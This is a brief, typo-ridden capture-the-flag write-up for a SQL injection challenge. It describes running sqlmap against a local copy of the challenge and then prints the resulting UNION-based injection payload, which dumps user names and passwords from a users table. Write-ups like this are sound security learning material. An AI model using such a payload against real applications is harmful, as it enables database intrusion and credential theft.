Looking at the name of the challeneg we already know it's sqlijection challenege. So what i did was spwan a local stance of the we g the source code given. Then i used sqlmap against to obtain the payload used to dump the database.

Payload

```
-4113" UNION ALL SELECT CHAR(113,113,98,107,113)||JSON_GROUP_ARRAY(COALESCE(name,CHAR(32))||CHAR(97,113,101,111,111,109)||COALESCE(password,CHAR(32)))||CHAR(113,122,120,112,113) FROM users-- ZsWA
```

